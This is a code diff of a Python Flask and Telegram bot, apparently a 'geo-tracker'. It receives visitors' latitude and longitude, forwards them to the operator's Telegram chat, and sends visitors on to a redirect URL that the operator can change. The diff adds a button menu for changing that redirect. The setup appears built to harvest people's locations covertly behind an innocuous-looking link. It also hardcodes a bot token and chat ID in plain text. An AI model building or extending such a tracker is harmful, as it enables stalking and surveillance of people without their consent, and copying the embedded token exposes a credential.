@@ -4,6 +4,7 @@ import telebot
 import threading
 import os
 from flask_cors import CORS
+from telebot import types  # для кнопок
 
 BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
 CHAT_ID = 651911888
@@ -13,7 +14,10 @@ CORS(app)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-redirect_url = 'https://yandex.ru'
+redirect_url = 'https://geo-tracker-l5ui.onrender.com'  # твой Render URL
+
+# Для хранения состояния, ждём ли ввода нового редиректа
+waiting_for_redirect = set()
 
 def send_to_telegram(lat, lon):
     text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
@@ -66,25 +70,44 @@ def send_location():
         return {'status': 'ok'}
     return {'status': 'error'}, 400
 
-@bot.message_handler(commands=['setredirect'])
-def cmd_setredirect(message):
-    global redirect_url
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
     if message.chat.id != CHAT_ID:
         bot.reply_to(message, "❌ Доступ запрещен.")
         return
-    args = message.text.split(maxsplit=1)
-    if len(args) == 2:
-        url = args[1].strip()
-        if url.startswith('http://') or url.startswith('https://'):
-            redirect_url = url
-            bot.reply_to(message, f"✅ Редирект установлен на:\n{url}")
-        else:
-            bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://")
-    else:
-        bot.reply_to(message, "Использование:\n/setredirect https://example.com")
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    btn1 = types.KeyboardButton("Изменить редирект")
+    btn2 = types.KeyboardButton("Скинуть ссылку на Render")
+    markup.add(btn1, btn2)
+    bot.send_message(message.chat.id, "Привет! Выбери действие:", reply_markup=markup)
+
+@bot.message_handler(func=lambda message: message.text == "Изменить редирект")
+def change_redirect(message):
+    if message.chat.id != CHAT_ID:
+        bot.reply_to(message, "❌ Доступ запрещен.")
+        return
+    bot.send_message(message.chat.id, "Отправь новую ссылку (начинающуюся с http:// или https://):")
+    waiting_for_redirect.add(message.chat.id)
+
+@bot.message_handler(func=lambda message: message.chat.id in waiting_for_redirect)
+def receive_new_redirect(message):
+    global redirect_url
+    if not (message.text.startswith('http://') or message.text.startswith('https://')):
+        bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://\nПопробуй ещё раз:")
+        return
+    redirect_url = message.text
+    bot.reply_to(message, f"✅ Редирект успешно изменён на:\n{redirect_url}")
+    waiting_for_redirect.remove(message.chat.id)
+
+@bot.message_handler(func=lambda message: message.text == "Скинуть ссылку на Render")
+def send_render_link(message):
+    if message.chat.id != CHAT_ID:
+        bot.reply_to(message, "❌ Доступ запрещен.")
+        return
+    bot.send_message(message.chat.id, f"Текущая ссылка на Render:\n{redirect_url}")
 
 def run_bot():
-    bot.remove_webhook()  # Важно! Убираем webhook перед polling
+    bot.remove_webhook()
     bot.infinity_polling()
 
 if __name__ == '__main__':
